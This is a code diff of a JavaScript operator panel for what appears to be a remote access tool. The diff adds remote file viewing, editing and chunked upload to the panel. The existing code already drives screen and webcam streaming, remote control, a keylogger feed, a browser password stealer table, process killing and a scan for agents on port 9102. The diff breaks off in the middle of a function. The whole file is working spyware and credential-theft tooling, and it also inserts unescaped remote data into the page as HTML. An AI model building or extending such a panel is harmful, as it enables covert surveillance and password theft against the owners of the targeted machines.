@@ -17,6 +17,16 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentPasswordData = [];
     let currentBrowserName = "unknown";
     let confirmCallback = null;
+    let currentEditingFile = null;
+
+    let uploadState = {
+        active: false,
+        file: null,
+        offset: 0,
+        chunkSize: 1024 * 1024, // 1MB mỗi chunk
+        totalChunks: 0,
+        currentChunkIndex: 0
+    };
 
     // Helpers
     const $ = (s) => document.querySelector(s);
@@ -25,7 +35,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // =================================================================
     // REGION 2: DOM ELEMENTS
     // =================================================================
-    
+
     // --- Connection & Status ---
     const statusPill = $('#status-pill');
     const statusText = $('#status-pill .status-text');
@@ -46,7 +56,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnStartStream = $('#btn-start-stream');
     const btnStopStream = $('#btn-stop-stream');
     const streamImg = $('#stream-img');
-    const mouseToggle = $('#toggle-mouse-control');
+    const controlToggle = $('#toggle-control');
 
     // --- Webcam (Record & Stream) ---
     const btnStartRecord = $('#btn-start-record');
@@ -76,6 +86,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnFsRefresh = $('#btn-fs-refresh');
     const btnNewFolder = $('#btn-fs-new-folder');
     const btnNewFile = $('#btn-fs-new-file');
+    const btnUploadFile = $('#btn-fs-upload');
 
     // --- System & Nav ---
     const sidebar = $('#sidebar');
@@ -86,7 +97,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const confirmTitle = $('#confirm-title');
     const confirmMsg = $('#confirm-message');
     const btnConfirmYes = $('#btn-confirm-yes');
-    
+
     // --- Passwords ---
     const passwordTbody = document.getElementById('password-list-body');
     const passwordModal = document.getElementById('password-modal');
@@ -103,9 +114,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
         try {
             ws = new WebSocket(url);
-        } catch (e) { return alert("Invalid URL"); }
+        } catch (e) {
+            return alert("Invalid URL");
+        }
 
         ws.onopen = () => {
+            if (!currentAgentId) currentAgentId = "MANUAL_CONN";
             setConnectedState(true, currentAgentId);
             if (currentAgentId) loadDataForView(currentView);
         };
@@ -120,8 +134,8 @@ document.addEventListener('DOMContentLoaded', () => {
         ws.onmessage = onWsMessage;
     }
 
-    function disconnectWs() { 
-        if (ws) ws.close(); 
+    function disconnectWs() {
+        if (ws) ws.close();
     }
 
     function sendWsMessage(payload) {
@@ -157,7 +171,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 else renderAppTable(msg.data);
                 break;
 
-            // Screen
+                // Screen
             case 'screenshot':
                 handleScreenshotResult(msg.data);
                 break;
@@ -170,7 +184,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 break;
 
-            // Webcam
+                // Webcam
             case 'webcam_recording_status':
                 handleWebcamStatus(msg);
                 break;
@@ -185,12 +199,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 webcamStreamImg.src = "data:image/jpeg;base64," + msg.data;
                 break;
 
-            // Keylogger
+                // Keylogger
             case 'key_event':
                 handleKeyEvent(msg.key_code, msg.key_char);
                 break;
 
-            // Stealer
+                // Stealer
             case 'passwords_result':
                 const browserName = msg.browser ? msg.browser.toUpperCase() : "BROWSER";
                 if (!msg.data || msg.data.length === 0) {
@@ -208,12 +222,16 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 break;
 
-            // System
+                // System
             case 'error':
                 alert("Server Error: " + msg.message);
                 break;
             case 'status':
                 if (currentView === 'files') unlockFileUI();
+                if (msg.success && msg.message === "Chunk received" && uploadState.active) {
+                    // Server đã nhận xong chunk trước, gửi chunk tiếp theo
+                    sendNextChunk(); 
+                }
                 if (msg.success) {
                     if (isStopAppOpen) sendWsMessage({ command: 'list_applications' });
                     if (isStopProcOpen) sendWsMessage({ command: 'list_processes' });
@@ -221,9 +239,17 @@ document.addEventListener('DOMContentLoaded', () => {
                     if (currentView.includes('app')) sendWsMessage({ command: 'list_applications' });
                     if (currentView === 'files') sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' });
                 } else {
+                    if (uploadState.active) {
+                        console.error("Upload failed by server:", msg.message);
+                        resetUploadState(); 
+                    }
+
                     if (currentView === 'files') {
                         const grid = document.getElementById('file-grid');
-                        if (grid) { grid.style.opacity = '1'; grid.style.pointerEvents = 'auto'; }
+                        if (grid) {
+                            grid.style.opacity = '1';
+                            grid.style.pointerEvents = 'auto';
+                        }
                     }
                     if (msg.message === 'capture failed') {
                         captureSpinner.classList.add('hidden');
@@ -232,7 +258,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 break;
 
-            // File Manager
+                // File Manager
             case 'drive_list':
                 renderDriveTree(msg.data);
                 break;
@@ -244,6 +270,10 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'file_download':
                 if (msg.success) downloadBase64File(msg.data, msg.name);
                 else alert("Download failed!");
+                break;
+            case 'file_view':
+                if (msg.success) handleFileView(msg.name, msg.data, msg.path);
+                else alert("Cannot view file: " + msg.message);
                 break;
         }
     }
@@ -306,7 +336,7 @@ document.addEventListener('DOMContentLoaded', () => {
         btnStopStream.classList.add('hidden');
         btnSaveScreenshot.classList.add('hidden');
         btnCopyScreenshot.classList.add('hidden');
-        mouseToggle.checked = false;
+        controlToggle.checked = false;
     }
 
     // --- Webcam Logic ---
@@ -337,7 +367,9 @@ document.addEventListener('DOMContentLoaded', () => {
             btnStopRecord.classList.add('hidden');
             btnStartWebcamStream.classList.remove('hidden');
             btnStopWebcamStream.classList.add('hidden');
-            setTimeout(() => { webcamStatus.classList.add('hidden'); }, 3000);
+            setTimeout(() => {
+                webcamStatus.classList.add('hidden');
+            }, 3000);
         }
     }
 
@@ -350,10 +382,14 @@ document.addEventListener('DOMContentLoaded', () => {
         try {
             const chars = atob(b64);
             const bytes = new Uint8Array(chars.length);
-            for (let i = 0; i < chars.length; i++) { bytes[i] = chars.charCodeAt(i); }
+            for (let i = 0; i < chars.length; i++) {
+                bytes[i] = chars.charCodeAt(i);
+            }
 
             if (currentVideoUrl) URL.revokeObjectURL(currentVideoUrl);
-            currentVideoBlob = new Blob([bytes], { type: 'video/mp4' });
+            currentVideoBlob = new Blob([bytes], {
+                type: 'video/mp4'
+            });
             currentVideoUrl = URL.createObjectURL(currentVideoBlob);
 
             webcamVideoOutput.src = currentVideoUrl;
@@ -404,14 +440,20 @@ document.addEventListener('DOMContentLoaded', () => {
         clearWebcamStreamUI();
     }
 
-    function sanitizeId(str) { return str.replace(/[^a-zA-Z0-9]/g, '-'); }
+    function sanitizeId(str) {
+        return str.replace(/[^a-zA-Z0-9]/g, '-');
+    }
 
     function downloadBase64File(base64, fileName) {
         try {
             const binaryString = atob(base64);
             const bytes = new Uint8Array(binaryString.length);
-            for (let i = 0; i < binaryString.length; i++) { bytes[i] = binaryString.charCodeAt(i); }
-            const blob = new Blob([bytes], { type: "application/octet-stream" });
+            for (let i = 0; i < binaryString.length; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            const blob = new Blob([bytes], {
+                type: "application/octet-stream"
+            });
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
             link.download = fileName;
@@ -423,6 +465,364 @@ document.addEventListener('DOMContentLoaded', () => {
             alert("Error saving file.");
         }
     }
+
+    // --- FILE VIEWING LOGIC ---
+    function handleFileView(filename, base64, path) {
+        const ext = filename.split('.').pop().toLowerCase();
+        
+        // Tạo modal đơn giản bằng JS nếu chưa có HTML (hoặc log ra console trước)
+        // Ở đây tôi giả định bạn sẽ có một vùng hiển thị, tôi sẽ tạo nhanh một Modal overlay
+        let viewer = document.getElementById('file-viewer-modal');
+        if (!viewer) {
+            viewer = document.createElement('div');
+            viewer.id = 'file-viewer-modal';
+            
+            // SỬA: Dùng CSS trực tiếp thay vì class Tailwind
+            viewer.style.cssText = `
+                position: fixed;
+                top: 0; left: 0; right: 0; bottom: 0;
+                background-color: rgba(0, 0, 0, 0.9);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 9999;
+            `;
+            viewer.classList.add('hidden'); // Giữ class hidden để ẩn/hiện
+
+            // SỬA: Cấu trúc bên trong cũng dùng style trực tiếp
+            viewer.innerHTML = `
+                <div style="
+                    background-color: #1f2937; 
+                    padding: 20px; 
+                    border-radius: 8px; 
+                    max-width: 800px; 
+                    width: 90%; 
+                    max-height: 90vh; 
+                    overflow: auto; 
+                    position: relative; 
+                    display: flex; 
+                    flex-direction: column; 
+                    align-items: center;
+                    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+                ">
+                    <button id="close-viewer" style="
+                        position: absolute; 
+                        top: 10px; 
+                        right: 10px; 
+                        color: white; 
+                        background-color: #dc2626; 
+                        border: none; 
+                        padding: 5px 12px; 
+                        border-radius: 4px; 
+                        cursor: pointer; 
+                        font-weight: bold;
+                    ">X</button>
+                    
+                    <h3 id="viewer-title" style="
+                        color: white; 
+                        margin-bottom: 15px; 
+                        font-weight: bold; 
+                        width: 100%; 
+                        text-align: center; /* Đã sửa thành center cho đẹp */
+                        font-family: sans-serif;
+                    "></h3>
+                    
+                    <div id="viewer-content" style="
+                        width: 100%; 
+                        display: flex; 
+                        justify-content: center; 
+                        color: #e5e7eb;
+                    "></div>
+                </div>`;
+            document.body.appendChild(viewer);
+            
+            // Thêm sự kiện đóng
+            viewer.querySelector('#close-viewer').onclick = () => {
+                viewer.classList.add('hidden');
+                // Dừng video/audio khi đóng
+                viewer.querySelector('#viewer-content').innerHTML = ''; 
+            };
+        }
+
+
+        const contentBox = viewer.querySelector('#viewer-content');
+        const titleBox = viewer.querySelector('#viewer-title');
+        titleBox.textContent = `Viewing: ${filename}`;
+        contentBox.innerHTML = '';
+        viewer.classList.remove('hidden');
+
+        if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].includes(ext)) {
+            // IMAGE
+            contentBox.innerHTML = `<img src="data:image/${ext};base64,${base64}" style="max-width:100%; max-height:80vh;">`;
+        } else if (['mp4', 'webm', 'ogg', 'mov'].includes(ext)) {
+            // VIDEO
+            // Cần convert base64 -> Blob URL để player chạy mượt hơn
+            const binary = atob(base64);
+            const array = new Uint8Array(binary.length);
+            for(let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
+
+            let mimeType = `video/${ext}`;
+            if (ext === 'mov') {
+                mimeType = 'video/quicktime';
+            }
+
+            const blob = new Blob([array], {type: `video/${ext}`});
+            const url = URL.createObjectURL(blob);
+            
+            contentBox.innerHTML = `<video controls autoplay src="${url}" style="max-width:100%; max-height:80vh;"></video>`;
+        } else if (['txt', 'log', 'ini', 'cfg', 'bat', 'cmd', 'cpp', 'h', 'js', 'html', 'css', 'json', 'xml'].includes(ext)) {
+            // TEXT
+            try {
+                // Decode UTF8 text từ Base64
+                const text = decodeURIComponent(escape(atob(base64))); 
+                
+                // Lưu lại đường dẫn file đang mở để lát nữa Save
+                currentEditingFile = path; 
+
+                // Render Textarea và nút Save
+                contentBox.innerHTML = `
+                    <div style="display: flex; flex-direction: column; width: 100%; height: 80vh;">
+                        <textarea id="file-editor-area" style="
+                            flex: 1; 
+                            background: #111; 
+                            color: #0f0; 
+                            font-family: monospace; 
+                            padding: 15px; 
+                            border: 1px solid #444; 
+                            resize: none; 
+                            outline: none;
+                            font-size: 14px;
+                            line-height: 1.5;
+                        ">${text.replace(/</g, '&lt;')}</textarea>
+                        
+                        <div style="
+                            margin-top: 10px; 
+                            display: flex; 
+                            justify-content: flex-end; 
+                            gap: 10px;
+                        ">
+                            <span id="save-status" style="color: #0f0; margin-right: 10px; display: none;">Saved!</span>
+                            <button onclick="saveCurrentFile()" style="
+                                background-color: #2563eb; 
+                                color: white; 
+                                padding: 8px 16px; 
+                                border: none; 
+                                border-radius: 4px; 
+                                cursor: pointer; 
+                                font-weight: bold;
+                            ">Save Changes</button>
+                        </div>
+                    </div>
+                `;
+            } catch (e) {
+                console.error(e);
+                contentBox.textContent = "Error decoding text content for editing.";
+            }
+        } else if (ext === 'pdf') {
+            // 1. Chuyển Base64 sang Blob
+            const binary = atob(base64);
+            const len = binary.length;
+            const buffer = new Uint8Array(len);
+            for (let i = 0; i < len; i++) buffer[i] = binary.charCodeAt(i);
+            
+            const blob = new Blob([buffer], { type: 'application/pdf' });
+            const url = URL.createObjectURL(blob);
+
+            // 2. Hiển thị bằng iframe (Trình duyệt sẽ tự kích hoạt PDF Viewer)
+            contentBox.innerHTML = `
+                <iframe src="${url}" style="width: 100%; height: 80vh; border: none; background: #fff;">
+                </iframe>`;
+        } else if (['mp3', 'wav', 'ogg', 'm4a', 'flac', 'aac'].includes(ext)) {
+            // 1. Chuyển Base64 sang Binary Blob
+            const binary = atob(base64);
+            const array = new Uint8Array(binary.length);
+            for(let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
+
+            // 2. Xác định MIME Type chuẩn
+            let mimeType = 'audio/mpeg'; // Mặc định cho mp3
+            switch (ext) {
+                case 'wav':  mimeType = 'audio/wav'; break;
+                case 'ogg':  mimeType = 'audio/ogg'; break;
+                case 'm4a':  mimeType = 'audio/aac'; break;
+                case 'flac': mimeType = 'audio/flac'; break;
+                case 'aac':  mimeType = 'audio/aac'; break;
+            }
+
+            const blob = new Blob([array], {type: mimeType});
+            const url = URL.createObjectURL(blob);
+
+            // 3. Render trình phát nhạc (Kèm icon cho đẹp)
+            // Lưu ý: data-feather="music" sẽ cần gọi feather.replace() sau khi render
+            contentBox.innerHTML = `
+                <div style="text-align: center; color: white; width: 100%;">
+                    <div style="margin-bottom: 20px; opacity: 0.8;">
+                        <i data-feather="music" style="width: 64px; height: 64px;"></i>
+                    </div>
+                    <h3 style="margin-bottom: 15px; font-family: sans-serif;">${filename}</h3>
+                    <audio controls autoplay style="width: 80%; max-width: 500px;">
+                        <source src="${url}" type="${mimeType}">
+                        Your browser does not support the audio element.
+                    </audio>
+                </div>
+            `;
+            
+            // Kích hoạt lại icon Feather cho nội dung mới thêm vào
+            if (typeof feather !== 'undefined') feather.replace();
+        } else {
+            contentBox.textContent = "Preview not supported for this file type.";
+        }
+    }
+
+    // --- CHUNK UPLOAD HANDLERS ---
+    
+    function startFileUpload(file) {
+        if (uploadState.active) return alert("Another upload is in progress!");
+        
+        console.log(`[Upload] Starting: ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)`);
+        
+        // Cập nhật UI trạng thái
+        const statusPill = document.getElementById('status-pill');
+        if(statusPill) statusPill.innerText = `Preparing ${file.name}...`;
+
+        uploadState = {
+            active: true,
+            file: file,
+            offset: 0,
+            chunkSize: 512 * 1024, // 512KB (An toàn cho WebSocket)
+            totalChunks: Math.ceil(file.size / (512 * 1024)),
+            currentChunkIndex: 0
+        };
+
+        sendNextChunk();
+    }
+
+    function sendNextChunk() {
+        if (!uploadState.active || !uploadState.file) return;
+
+        const { file, offset, chunkSize, currentChunkIndex, totalChunks } = uploadState;
+
+        // Kiểm tra điều kiện kết thúc
+        if (offset >= file.size) {
+            console.log("[Upload] Finished!");
+            const statusPill = document.getElementById('status-pill');
+            if(statusPill) statusPill.innerText = `Upload Complete!`;
+            
+            // Reset trạng thái
+            resetUploadState();
+            
+            // Refresh lại danh sách file để hiện file mới
+            sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' });
+            
+            setTimeout(() => {
+                if(statusPill) statusPill.innerText = document.getElementById('status-text')?.textContent || "Connected";
+            }, 3000);
+            return;
+        }
+
+        // Cắt File (Slice)
+        const chunkBlob = file.slice(offset, offset + chunkSize);
+        
+        // Cập nhật UI %
+        const percent = Math.round((currentChunkIndex / totalChunks) * 100);
+        const statusPill = document.getElementById('status-pill');
+        if(statusPill) statusPill.innerText = `Uploading: ${percent}%`;
+
+        // Đọc Chunk sang Base64
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const rawBase64 = e.target.result.split(',')[1];
+            
+            // Chunk đầu tiên dùng mode 'overwrite', các chunk sau dùng 'append'
+            const mode = (offset === 0) ? 'overwrite' : 'append';
+
+            sendWsMessage({
+                command: 'fs_upload',
+                path: currentPath,
+                name: file.name, // Tên file giữ nguyên (JS tự encode UTF-8 trong JSON, C++ dùng ToWide để xử lý dấu)
+                data: rawBase64,
+                mode: mode 
+            });
+
+            // Tăng offset
+            uploadState.offset += chunkSize;
+            uploadState.currentChunkIndex++;
+        };
+        
+        reader.readAsDataURL(chunkBlob);
+    }
+
+    function resetUploadState() {
+        uploadState = {
+            active: false,
+            file: null,
+            offset: 0,
+            chunkSize: 1024 * 1024,
+            totalChunks: 0,
+            currentChunkIndex: 0
+        };
+        // Reset input để chọn lại file cũ được
+        const realFileInput = document.getElementById('hidden-file-input');
+        if (realFileInput) realFileInput.value = '';
+    }
+
+    window.saveCurrentFile = () => {
+        const textarea = document.getElementById('file-editor-area');
+        if (!textarea || !currentEditingFile) return;
+
+        const newContent = textarea.value;
+        const statusLabel = document.getElementById('save-status');
+
+        try {
+            // 1. Mã hóa nội dung text sang Base64 (Hỗ trợ UTF-8 tiếng Việt)
+            const base64Data = btoa(unescape(encodeURIComponent(newContent)));
+
+            // 2. Tách đường dẫn thư mục và tên file từ currentEditingFile
+            // Ví dụ: C:\Users\Admin\note.txt -> Folder: C:\Users\Admin, Name: note.txt
+            let folderPath = "";
+            let fileName = "";
+            
+            if (currentEditingFile.includes('\\')) {
+                const parts = currentEditingFile.split('\\');
+                fileName = parts.pop();
+                folderPath = parts.join('\\');
+                // Xử lý trường hợp ổ đĩa gốc (C:\)
+                if (folderPath.endsWith(':')) folderPath += '\\';
+            } else if (currentEditingFile.includes('/')) {
+                const parts = currentEditingFile.split('/');
+                fileName = parts.pop();
+                folderPath = parts.join('/');
+            } else {
+                // Trường hợp file nằm ngay thư mục hiện tại không có path separator
+                folderPath = currentPath; 
+                fileName = currentEditingFile;
+            }
+
+            // 3. Gửi lệnh upload (ghi đè)
+            sendWsMessage({
+                command: 'fs_upload',
+                path: folderPath,
+                name: fileName,
+                data: base64Data
+            });
+
+            // 4. Hiển thị thông báo nhỏ
+            if (statusLabel) {
+                statusLabel.style.display = 'inline';
+                setTimeout(() => { statusLabel.style.display = 'none'; }, 2000);
+            }
+
+        } catch (e) {
+            alert("Error saving file: Encoding failed.");
+            console.error(e);
+        }
+    };
+
+    window.requestViewFile = (encodedName) => {
+        event.stopPropagation();
+        const name = decodeURIComponent(encodedName);
+        const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
+        sendWsMessage({ command: 'fs_view', path: fullPath });
+    };
 
     // =================================================================
     // REGION 5: UI RENDERING
@@ -454,50 +854,62 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderProcessTable(data) {
         const tbody = $('#processes-table tbody');
         if (!tbody) return;
-        if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="4">No data.</td></tr>'; return; }
+        if (!data || !data.length) {
+            tbody.innerHTML = '<tr><td colspan="4">No data.</td></tr>';
+            return;
+        }
         const fmt = new Intl.NumberFormat('en-US');
         tbody.innerHTML = data.map(p => `
-            <tr><td><span class="status-pill" style="background:rgba(0,0,0,0.05);color:var(--text-main)">${p.pid}</span></td>
-            <td>${p.name}</td><td>${p.workingSet ? fmt.format(p.workingSet)+' B' : 'N/A'}</td>
-            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-proc" data-pid="${p.pid}">Stop</button></td></tr>`).join('');
+        <tr><td><span class="status-pill" style="background:rgba(0,0,0,0.05);color:var(--text-main)">${p.pid}</span></td>
+        <td>${p.name}</td><td>${p.workingSet ? fmt.format(p.workingSet) + ' B' : 'N/A'}</td>
+        <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-proc" data-pid="${p.pid}">Stop</button></td></tr>`).join('');
     }
 
     function renderAppTable(data) {
         const tbody = $('#apps-table tbody');
         if (!tbody) return;
-        if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="3">No data.</td></tr>'; return; }
+        if (!data || !data.length) {
+            tbody.innerHTML = '<tr><td colspan="3">No data.</td></tr>';
+            return;
+        }
         tbody.innerHTML = data.map(a => `
-            <tr><td style="font-weight:500">${a.name}</td><td>${a.process_count}</td>
-            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-app" data-name="${a.name}">End Task</button></td></tr>`).join('');
+        <tr><td style="font-weight:500">${a.name}</td><td>${a.process_count}</td>
+        <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-app" data-name="${a.name}">End Task</button></td></tr>`).join('');
     }
 
     function renderStopProcList(data) {
         const container = $('#stop-proc-list');
-        if (!data || data.length === 0) { container.innerHTML = '<div class="list-loading">No processes found.</div>'; return; }
+        if (!data || data.length === 0) {
+            container.innerHTML = '<div class="list-loading">No processes found.</div>';
+            return;
+        }
         const displayData = data.slice(0, 100);
         container.innerHTML = displayData.map(proc => `
-            <div class="list-item">
-                <div class="item-info">
-                    <span class="item-name">${proc.name}</span>
-                    <span class="item-sub">PID: ${proc.pid} | RAM: ${(proc.workingSet/1024/1024).toFixed(1)} MB</span>
-                </div>
-                <button class="btn-kill-sm" onclick="requestStopProc(${proc.pid})" title="Kill PID ${proc.pid}"><i data-feather="x"></i></button>
-            </div>`).join('');
+        <div class="list-item">
+        <div class="item-info">
+        <span class="item-name">${proc.name}</span>
+        <span class="item-sub">PID: ${proc.pid} | RAM: ${(proc.workingSet / 1024 / 1024).toFixed(1)} MB</span>
+        </div>
+        <button class="btn-kill-sm" onclick="requestStopProc(${proc.pid})" title="Kill PID ${proc.pid}"><i data-feather="x"></i></button>
+        </div>`).join('');
         if (data.length > 100) container.innerHTML += `<div class="list-loading" style="font-size:11px">...and ${data.length - 100} more processes</div>`;
         if (typeof feather !== 'undefined') feather.replace();
     }
 
     function renderStopAppList(data) {
         const container = $('#stop-app-list');
-        if (!data || data.length === 0) { container.innerHTML = '<div class="list-loading">No running apps found.</div>'; return; }
+        if (!data || data.length === 0) {
+            container.innerHTML = '<div class="list-loading">No running apps found.</div>';
+            return;
+        }
         container.innerHTML = data.map(app => `
-            <div class="list-item">
-                <div class="item-info">
-                    <span class="item-name">${app.name}</span>
-                    <span class="item-sub">${app.process_count} process(es)</span>
-                </div>
-                <button class="btn-kill-sm" onclick="requestStopApp('${app.name}')" title="Stop App"><i data-feather="power"></i></button>
-            </div>`).join('');
+        <div class="list-item">
+        <div class="item-info">
+        <span class="item-name">${app.name}</span>
+        <span class="item-sub">${app.process_count} process(es)</span>
+        </div>
+        <button class="btn-kill-sm" onclick="requestStopApp('${app.name}')" title="Stop App"><i data-feather="power"></i></button>
+        </div>`).join('');
         if (typeof feather !== 'undefined') feather.replace();
     }
 
@@ -507,11 +919,11 @@ document.addEventListener('DOMContentLoaded', () => {
             const safePath = d.path.replace(/\\/g, '\\\\');
             return `
             <div class="tree-node" data-path="${d.path}" data-loaded="false">
-                <div class="tree-item" onclick="onTreeItemClick(this, '${safePath}')">
-                    <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safePath}')"><i data-feather="chevron-right"></i></span>
-                    <i data-feather="hard-drive" style="width:14px;height:14px;"></i> <span>${d.name}</span>
-                </div>
-                <div class="tree-children" id="tree-child-${sanitizeId(d.path)}"></div>
+            <div class="tree-item" onclick="onTreeItemClick(this, '${safePath}')">
+            <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safePath}')"><i data-feather="chevron-right"></i></span>
+            <i data-feather="hard-drive" style="width:14px;height:14px;"></i> <span>${d.name}</span>
+            </div>
+            <div class="tree-children" id="tree-child-${sanitizeId(d.path)}"></div>
             </div>`;
         }).join('');
         if (typeof feather !== 'undefined') feather.replace();
@@ -534,11 +946,11 @@ document.addEventListener('DOMContentLoaded', () => {
             const safeChildPath = childPath.replace(/\\/g, '\\\\');
             return `
             <div class="tree-node" data-path="${childPath}" data-loaded="false">
-                <div class="tree-item" onclick="onTreeItemClick(this, '${safeChildPath}')">
-                    <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safeChildPath}')"><i data-feather="chevron-right"></i></span>
-                    <i data-feather="folder" style="width:14px;height:14px;color:#fbbf24"></i> <span>${f.name}</span>
-                </div>
-                <div class="tree-children" id="tree-child-${sanitizeId(childPath)}"></div>
+            <div class="tree-item" onclick="onTreeItemClick(this, '${safeChildPath}')">
+            <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safeChildPath}')"><i data-feather="chevron-right"></i></span>
+            <i data-feather="folder" style="width:14px;height:14px;color:#fbbf24"></i> <span>${f.name}</span>
+            </div>
+            <div class="tree-children" id="tree-child-${sanitizeId(childPath)}"></div>
             </div>`;
         }).join('');
         if (typeof feather !== 'undefined') feather.replace();
@@ -547,7 +959,10 @@ document.addEventListener('DOMContentLoaded', () => {
     function renderFileList(path, data) {
         currentPath = path;
         const grid = document.getElementById('file-grid');
-        if (grid) { grid.style.opacity = '1'; grid.style.pointerEvents = 'auto'; }
+        if (grid) {
+            grid.style.opacity = '1';
+            grid.style.pointerEvents = 'auto';
+        }
         const input = document.getElementById('fs-path-input');
         if (input) input.value = path;
 
@@ -564,15 +979,28 @@ document.addEventListener('DOMContentLoaded', () => {
         grid.innerHTML = data.map(item => {
             const isFolder = item.type === 'folder';
             const icon = isFolder ? 'folder' : 'file-text';
+            
+            // Đường dẫn hiển thị (để nguyên hoặc xử lý backslash)
             let fullPath = path.endsWith('\\') ? path + item.name : path + '\\' + item.name;
             const safePath = fullPath.replace(/\\/g, '\\\\');
-            const actionAttr = isFolder ? `ondblclick="openFolder('${safePath}')"` : '';
+
+            // QUAN TRỌNG: Mã hóa tên file để an toàn với tiếng Việt và Space
+            const encodedName = encodeURIComponent(item.name); 
+
+            // Sửa lại các hàm onclick để truyền encodedName
+            // Lưu ý: openFolder dùng safePath nên có thể giữ nguyên hoặc encode tùy logic server, 
+            // nhưng các hàm request...File thì BẮT BUỘC phải sửa.
+            
+            const actionAttr = isFolder ? `ondblclick="openFolder('${safePath.replace(/'/g, "\\'")}')"` : '';
 
             return `
             <div class="file-item" data-type="${item.type}" ${actionAttr} title="${item.name}">
                 <div class="file-actions">
-                    ${!isFolder ? `<button class="btn-fs-action download" onclick="requestDownloadFile('${item.name}')" title="Download"><i data-feather="download" style="width:12px;"></i></button>` : ''}
-                    <button class="btn-fs-action delete" onclick="requestDeleteFile('${item.name}')" title="Delete"><i data-feather="trash-2" style="width:12px;"></i></button>
+                    ${!isFolder ? `
+                        <button class="btn-fs-action" onclick="requestViewFile('${encodedName}')" title="View"><i data-feather="eye" style="width:12px;"></i></button>
+                        <button class="btn-fs-action download" onclick="requestDownloadFile('${encodedName}')" title="Download"><i data-feather="download" style="width:12px;"></i></button>
+                    ` : ''}
+                    <button class="btn-fs-action delete" onclick="requestDeleteFile('${encodedName}')" title="Delete"><i data-feather="trash-2" style="width:12px;"></i></button>
                 </div>
                 <div class="file-icon"><i data-feather="${icon}" style="width:32px;height:32px;"></i></div>
                 <span class="file-name">${item.name}</span>
@@ -601,11 +1029,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (!data || data.length === 0) {
             container.innerHTML = `
-                <div class="list-loading" style="grid-column: 1 / -1;">
-                    <div class="spinner" style="border-color: #06b6d4; border-top-color: transparent;"></div>
-                    <br><span style="color: #06b6d4; font-weight: 500;">Scanning Radar Active...</span>
-                    <br><small style="opacity:0.7">Looking for agents on port 9102</small>
-                </div>`;
+            <div class="list-loading" style="grid-column: 1 / -1;">
+            <div class="spinner" style="border-color: #06b6d4; border-top-color: transparent;"></div>
+            <br><span style="color: #06b6d4; font-weight: 500;">Scanning Radar Active...</span>
+            <br><small style="opacity:0.7">Looking for agents on port 9102</small>
+            </div>`;
             return;
         }
 
@@ -618,8 +1046,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
             return `
             <div class="device-card ${selectedClass}" data-os="${agent.os}" data-agent-id="${agent.agentId}" onclick="selectAgent('${agent.agentId}', '${agent.hostname}')">
-                <div class="device-status" title="Online"></div>
-                <div class="device-info"><span class="device-hostname" title="${agent.hostname}">${agent.hostname}</span><span class="device-ip">${agent.agentId || agent.ip}</span></div>
+            <div class="device-status" title="Online"></div>
+            <div class="device-info"><span class="device-hostname" title="${agent.hostname}">${agent.hostname}</span><span class="device-ip">${agent.agentId || agent.ip}</span></div>
             </div>`;
         }).join('');
         if (typeof feather !== 'undefined') feather.replace();
@@ -637,10 +1065,10 @@ document.addEventListener('DOMContentLoaded', () => {
             const row = document.createElement('tr');
             const displayUrl = p.url.length > 60 ? p.url.substring(0, 60) + '...' : p.url;
             row.innerHTML = `
-                <td><span class="url-cell" title="${p.url}">${displayUrl}</span></td>
-                <td><span class="user-cell">${p.user}</span></td>
-                <td><span class="pass-cell">${p.pass}</span></td>
-                <td class="text-center"><button class="btn-copy" id="btn-copy-${index}" onclick="handleCopy(${index})">Copy</button></td>`;
+            <td><span class="url-cell" title="${p.url}">${displayUrl}</span></td>
+            <td><span class="user-cell">${p.user}</span></td>
+            <td><span class="pass-cell">${p.pass}</span></td>
+            <td class="text-center"><button class="btn-copy" id="btn-copy-${index}" onclick="handleCopy(${index})">Copy</button></td>`;
             passwordTbody.appendChild(row);
         });
 
@@ -653,23 +1081,57 @@ document.addEventListener('DOMContentLoaded', () => {
     // =================================================================
 
     window.selectAgent = (agentId, hostname) => {
+        // 1. Cập nhật ID của Agent mới
         currentAgentId = agentId;
         console.log('[App] Selected agent:', agentId, hostname);
+
+        // 2. Chuẩn bị URL (để hiển thị vào ô input cho đúng)
         const proto = location.protocol === 'https:' ? 'wss' : 'ws';
         const url = `${proto}://${location.host}/ws`;
         wsUrlInput.value = url;
+
+        // 3. Đóng Modal Scan
         handleCloseModal();
-        if (ws && ws.readyState === WebSocket.OPEN) ws.close();
-        
-        setTimeout(() => {
+
+        // 4. KIỂM TRA TRẠNG THÁI KẾT NỐI
+        if (ws && ws.readyState === WebSocket.OPEN) {
